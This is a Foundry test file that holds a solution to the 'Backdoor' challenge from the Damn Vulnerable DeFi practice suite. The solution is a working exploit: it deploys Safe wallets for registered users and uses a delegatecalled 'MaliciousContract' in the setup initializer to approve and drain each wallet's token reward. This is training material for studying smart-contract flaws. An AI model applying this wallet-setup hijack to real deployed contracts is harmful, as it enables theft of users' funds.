// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";

contract BackdoorChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    address[] users = [makeAddr("alice"), makeAddr("bob"), makeAddr("charlie"), makeAddr("david")];

    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;

    DamnValuableToken token;
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy Safe copy and factory
        singletonCopy = new Safe();
        walletFactory = new SafeProxyFactory();

        // Deploy reward token
        token = new DamnValuableToken();

        // Deploy the registry
        walletRegistry = new WalletRegistry(address(singletonCopy), address(walletFactory), address(token), users);

        // Transfer tokens to be distributed to the registry
        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(walletRegistry.owner(), deployer);
        assertEq(token.balanceOf(address(walletRegistry)), AMOUNT_TOKENS_DISTRIBUTED);
        for (uint256 i = 0; i < users.length; i++) {
            // Users are registered as beneficiaries
            assertTrue(walletRegistry.beneficiaries(users[i]));

            // User cannot add beneficiaries
            vm.expectRevert(0x82b42900); // `Unauthorized()`
            vm.prank(users[i]);
            walletRegistry.addBeneficiary(users[i]);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_backdoor() public checkSolvedByPlayer {
        MaliciousContract malicious = new MaliciousContract(address(token), player);

        address[] memory _owners = new address[](1);
        address to = address(malicious); //address(walletRegistry);
        bytes memory data = abi.encodeWithSignature("transfer()");
        uint256 _threshold = 1;
        address fallbackHandler = address(0); //address(token);
        address paymentToken = address(0);
        uint256 payment = 0;

        // setup(address[] calldata _owners, uint256 _threshold, address to, bytes calldata data, address fallbackHandler, address paymentToken, uint256 payment, address payable paymentReceiver)
        for (uint256 i = 0; i < users.length; i++) {
            _owners[0] = users[i];
            address payable paymentReceiver = payable(users[i]);
            bytes memory initializer = abi.encodeWithSelector(
                // "setup(address[],uint256,addressto,bytes,address,address,uint256,address)",
                Safe.setup.selector,
                _owners,
                _threshold,
                to,
                data,
                fallbackHandler,
                paymentToken,
                payment,
                paymentReceiver
            );

            // walletFactory.createProxyWithNonce(address(singletonCopy), initializer, 0);

            //     function createProxyWithCallback(
            //     address _singleton,
            //     bytes memory initializer,
            //     uint256 saltNonce,
            //     IProxyCreationCallback callback
            // )

            address proxy =
                address(walletFactory.createProxyWithCallback(address(singletonCopy), initializer, 0, walletRegistry));

            token.transferFrom(address(proxy), recovery, 10e18);
        }
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        for (uint256 i = 0; i < users.length; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            assertTrue(wallet != address(0), "User didn't register a wallet");

            // User is no longer registered as a beneficiary
            assertFalse(walletRegistry.beneficiaries(users[i]));
        }

        // Recovery account must own all tokens
        assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
    }
}

contract MaliciousContract {
    DamnValuableToken immutable token;
    address immutable player;

    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;

    constructor(address _token, address _player) {
        player = _player;
        token = DamnValuableToken(_token);
    }

    function transfer() external payable {
        // token.transfer(msg.sender, token.balanceOf(address(this)));
        token.approve(player, 10e18);
    }
}
